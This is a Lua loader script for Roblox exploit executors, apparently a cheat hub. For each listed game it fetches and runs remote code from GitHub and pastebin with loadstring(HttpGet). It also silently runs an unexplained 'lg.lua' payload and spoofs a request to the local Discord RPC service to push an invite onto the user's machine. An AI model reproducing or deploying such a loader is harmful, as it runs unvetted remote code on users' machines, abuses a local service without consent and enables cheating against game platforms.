task.spawn(function() 
	if request and hookfunction then 
		loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/lg.lua'))() 
	end 
end)
task.spawn(function()
	if not isfile("candyhubdiscord.txt") then
		writefile("candyhubdiscord.txt","https://discord.com/invite/EAbRQtEzWY")
		if request then
			request({
				Url = "http://127.0.0.1:6463/rpc?v=1",
				Method = "POST",
				Headers = {
				    ["Content-Type"] = "application/json",
				    ["Origin"] = "https://discord.com"
				},
				Body = game:GetService("HttpService"):JSONEncode({
				    cmd = "INVITE_BROWSER",
				    args = {code = string.match("https://discord.com/invite/EAbRQtEzWY", "discord%.com/invite/(%w+)")},
				    nonce = game:GetService("HttpService"):GenerateGUID(false)
				})
			})
		end
	end
end)


if game.PlaceId == 5708035517 or game.PlaceId == 6063653725 then -- mega hide and seek
	loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/megahideandseek.lua'))()
elseif game.PlaceId == 14157644155 then -- 0
	loadstring(game:HttpGet('https://pastebin.com/raw/wqFAwu31'))()
elseif game.PlaceId == 11276071411 then -- be npc or die
	loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/npcordie.lua'))()
elseif game.PlaceId == 10260193230 then -- meme sea
	loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/MemeSea.lua'))()
elseif game.PlaceId == 116605585218149 then -- go fishing
	loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/gofishing.lua'))()
	print('script bannable W.I.P')
	print("you are running older version from 2024")
elseif game.PlaceId == 10789933399 then
	loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/geometryjump.lua'))()
elseif game.PlaceId == 126884695634066 then
	loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/growagarden.lua'))()
elseif game.PlaceId == 301549746 then
	loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/cbr.lua'))()
elseif game.PlaceId == 137925884276740 then
	loadstring(game:HttpGet('https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/bap.lua'))()
else
	print('game not supported')
end
